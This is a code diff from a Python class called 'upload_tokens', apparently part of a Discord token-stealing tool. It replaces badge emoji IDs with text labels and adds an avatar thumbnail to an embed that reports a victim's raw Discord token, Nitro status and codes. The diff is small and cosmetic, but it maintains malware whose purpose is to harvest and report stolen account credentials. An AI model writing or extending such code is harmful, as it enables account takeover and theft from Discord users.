@@ -142,67 +142,67 @@ class upload_tokens:
     def calc_flags(self, flags: int) -> list:
         flags_dict = {
             "DISCORD_EMPLOYEE": {
-                "emoji": "<:staff:968704541946167357>",
+                "emoji": "Employee Bage",
                 "shift": 0,
                 "ind": 1
             },
             "DISCORD_PARTNER": {
-                "emoji": "<:partner:968704542021652560>",
+                "emoji": "Partner Bage",
                 "shift": 1,
                 "ind": 2
             },
             "HYPESQUAD_EVENTS": {
-                "emoji": "<:hypersquad_events:968704541774192693>",
+                "emoji": "Hypesquad Events Bage",
                 "shift": 2,
                 "ind": 4
             },
             "BUG_HUNTER_LEVEL_1": {
-                "emoji": "<:bug_hunter_1:968704541677723648>",
+                "emoji": "Bug Hunter 1 Bage",
                 "shift": 3,
                 "ind": 4
             },
             "HOUSE_BRAVERY": {
-                "emoji": "<:hypersquad_1:968704541501571133>",
+                "emoji": "",
                 "shift": 6,
                 "ind": 64
             },
             "HOUSE_BRILLIANCE": {
-                "emoji": "<:hypersquad_2:968704541883261018>",
+                "emoji": "",
                 "shift": 7,
                 "ind": 128
             },
             "HOUSE_BALANCE": {
-                "emoji": "<:hypersquad_3:968704541874860082>",
+                "emoji": "",
                 "shift": 8,
                 "ind": 256
             },
             "EARLY_SUPPORTER": {
-                "emoji": "<:early_supporter:968704542126510090>",
+                "emoji": "Early Supporter Bage",
                 "shift": 9,
                 "ind": 512
             },
             "BUG_HUNTER_LEVEL_2": {
-                "emoji": "<:bug_hunter_2:968704541774217246>",
+                "emoji": "Bug Hunter 2 Bage",
                 "shift": 14,
                 "ind": 16384
             },
             "VERIFIED_BOT_DEVELOPER": {
-                "emoji": "<:verified_dev:968704541702905886>",
+                "emoji": "Verified Bot Dev Bage",
                 "shift": 17,
                 "ind": 131072
             },
             "ACTIVE_DEVELOPER": {
-                "emoji": "<:Active_Dev:1045024909690163210>",
+                "emoji": "Active Dev Bage",
                 "shift": 22,
                 "ind": 4194304
             },
             "CERTIFIED_MODERATOR": {
-                "emoji": "<:certified_moderator:988996447938674699>",
+                "emoji": "Moderator Bage",
                 "shift": 18,
                 "ind": 262144
             },
             "SPAMMER": {
-                "emoji": "⌨",
+                "emoji": "Spammer",
                 "shift": 20,
                 "ind": 1048704
             },
@@ -340,6 +340,7 @@ class upload_tokens:
                 codes = None
 
             embed = Embed(title=f"{username}", color=0x000000)
+            embed.set_thumbnail(url=avatar)
 
             embed.add_field(name="🔑 Token", value=f"```{token}```", inline=False)
             embed.add_field(name="Nitro", value=f"```{nitro}```", inline=True),
